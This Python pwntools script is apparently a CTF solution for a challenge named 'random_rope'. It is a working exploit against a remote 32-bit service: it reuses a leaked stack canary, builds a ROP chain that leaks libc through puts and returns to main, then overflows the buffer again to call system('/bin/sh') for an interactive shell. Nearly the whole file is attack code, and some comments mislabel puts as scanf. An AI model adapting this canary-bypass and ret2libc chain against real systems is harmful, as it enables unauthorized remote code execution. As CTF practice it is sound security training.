#!/usr/bin/env python3

from pwn import *

proc = remote("172.17.0.6", 8888)
libc = ELF("./libc-2.28.so")
#proc = process("/home/kali/Documents/SB/MidnightCTF/PWN/pwn/infra/5_random_rope/random_rope")
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")

leak = proc.recvuntil(b":\n\n").decode()
log.info(leak)

log.info("Parsing the leak...")
leak = leak.split("\n")[1].split(":")[1].split(" ")

if int(leak[-5] )< 0:
    canary = (1 << 32) + int(leak[-5])
else:
    canary = int(leak[-5])

saved_ebp  = (1 << 32) + int(leak[-2])
saved_eip  = int(leak[-1])
pc_thunk   = int(leak[-3])
pad        = int(leak[-4])

log.info("Padding 1 : {}".format(hex(pad)))
log.info("Pc_thunk  : {}".format(hex(pc_thunk)))
log.info("Canary    : {}".format(hex(canary)))
log.info("Saved EBP : {}".format(hex(saved_ebp)))
log.info("Saved EIP : {}".format(hex(saved_eip)))

log.info("Crafting Payload...")

# Step 1 : Locate a print function (puts, puts...) so we can leak a libc function address by passing a GOT function's entry to it as a parameter.

plt_puts         = 0x00001050                   # Offset between the base addr and the PLT entry for "puts".
post_vuln_call   = 0x00001290                   # Offset between the base addr and the instruction that follows the call to "vuln", aka the saved_eip while we are in the "vuln" stackframe.
offset_plt_vuln  = post_vuln_call - plt_puts    # Offset between post_vuln_call and the PLT entry for the "puts" function.
real_plt_puts  = saved_eip - offset_plt_vuln    # PLT entry for the "puts" function at runtime.

log.info("PLT entry for 'puts' : {}".format(hex(real_plt_puts)))

# Step 2 : Locate the GOT entry for any function of the LIBC, so we can read the entry using "puts" and leak memory

got_puts         = 0x00004014                    # GOT entry for "scanf"
offset_got_vuln  = got_puts - post_vuln_call     # Offset between post_vuln_call and the GOT entry for "scanf"
real_got_puts    = saved_eip + offset_got_vuln   # GOT entry for the "scanf" function at runtime

log.info("GOT entry for 'puts' : {}".format(hex(real_got_puts)))

# Step 3 : Locate the "main" function address, so we can ret2main after leaking the libc and abuse the buffer overflow again.

main_addr        = 0x00001259                    # Offset between the base addr and the start of the main function
offset_main_vuln = post_vuln_call - main_addr    # Offset between the post_vuln_call and the main
ret2main         = saved_eip - offset_main_vuln  # "main" function address at runtime

log.info("Main address         : {}".format(hex(ret2main)))

# Step 4 : Locate a gadget "pop ebx;ret", so we can use it to control paramaters of the functions we want to call.

gadget          = 0x0000101e
offset_pop_vuln = post_vuln_call - gadget
real_gadget     = saved_eip - offset_pop_vuln

log.info("POP EBX;RET address  : {}".format(hex(real_gadget)))

log.info("Payload : A*32 + canary + padding (A*4) + pc_thunk + saved_ebp + plt_puts + pop ebx;ret + got_scanf + ret2main")

# Step 5 : build the payload and leak libc

payload  = b'A' * 32             # Padding to fill the buffer.
payload += p32(canary)           # Rewrite Canary, to avoid the stack smashing detection.
payload += b'JUNK'               # Padding to reach the saved EBP and EIP, because of stack alignment.
payload += p32(pc_thunk)         # Padding to reach the saved EBP and EIP, because of stack alignment.
payload += p32(saved_ebp)        # Rewrite the saved EBP.
payload += p32(real_plt_puts)    # Rewrite the saved EIP in order to call puts from the PLT stub.
payload += p32(real_gadget)      # Clean the Stack because we passed a parameter for puts.
payload += p32(real_got_puts)    # Parameter for puts, which is the GOT entry for the scanf function, leaking the libc. (-1 so we are sure to get the whole thing, and to not crash the program)
payload += p32(ret2main)         # Ret2main so we can abuse the buffer overflow again.

log.info("Sending payload...")
proc.sendline(payload)

answer = proc.recvuntil(b':\n\n')

log.info("{}".format(answer))

leak_scanf = u32(answer.split(b"\n\n\n")[2][:4])
log.info("'Scanf' function leak : {}".format(hex(leak_scanf)))
log.info("Locating 'system' function and exploiting the overflow again...")

# Step 6 : compute system() address and find a "/bin/sh" string, so we can jump on system() and get a shell

leak_system = leak_scanf - libc.symbols["puts"] + libc.symbols["system"]
leak_binsh  = leak_scanf - libc.symbols["puts"] + next(libc.search(b"/bin/sh\x00"))

log.info("'System' function leak  : {}".format(hex(leak_system)))
log.info("'/bin/sh\\x00' found at  : {}".format(hex(leak_binsh)))

log.info("Crafting Payload...")

# Step 7 : build the final payload and get the shell

payload  = b'A' * 32             # Padding to fill the buffer.
payload += p32(canary)           # Rewrite Canary, to avoid the stack smashing detection.
payload += b'JUNK'               # Padding to reach the saved EBP and EIP, because of stack alignment.
payload += p32(pc_thunk)         # Padding to reach the saved EBP and EIP, because of stack alignment.
payload += p32(saved_ebp)        # Rewrite the saved EBP -> that's an old EBP, we could use the new saved_ebp value but that's not a need.
payload += p32(leak_system)      # Rewrite the saved EIP in order to call the "system" function from the LIBC.
payload += p32(real_gadget)      # Clean the Stack because we passed a parameter.
payload += p32(leak_binsh)       # Parameter for system "/bin/sh\x00"

log.info("Payload : A*32 + canary + padding (A*4) + pc_thunk + saved_ebp + system + pop ebx;ret + '/bin/sh'")
log.info("Sending payload...")
proc.sendline(payload)

# Step 8 : enjoy ;)

proc.interactive()
